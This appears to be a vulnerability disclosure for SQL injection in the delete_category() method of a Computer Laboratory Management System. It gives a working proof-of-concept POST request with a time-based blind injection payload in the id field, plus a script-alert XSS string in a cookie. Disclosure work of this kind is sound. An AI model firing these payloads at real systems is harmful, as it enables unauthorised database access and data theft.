#### There is sql injection in the delete_category() method of the /classes/Master.php file of the Computer Laboratory Management System.

**Vulnerability Verification**：

poc

```
POST /classes/Master.php?f=delete_category HTTP/1.1
Host: lms:98
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://lms:98
Connection: keep-alive
Referer: http://localhost:98/?XDEBUG_SESSION_START=14848
Cookie: Phpstorm-9dbbfc29=4d9b54b0-3f53-4e67-ae29-a3fb9f021bbb; user=admin; name=aa%3Cscript%3Ealert%28111%29%3C%2Fscript%3E; mail=86226999%40qq.com; url=http%3A%2F%2F127.0.0.1; PHPSESSID=leagsbs030cq18dj30osfipt3t; XDEBUG_SESSION=14848
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Priority: u=0, i

id='/**/or/**/(select(1)from(select(sleep(6)))x)#
```

Successful six-second delay.

![QQ20240830-200014](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ20240830-200014.png)

**code analysis**

![QQ20240830-194310](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ20240830-194310.png)

Seeing that the id is spliced directly into the sql query without filtering, we can control the id value as we like.
Here's a direct time-blind

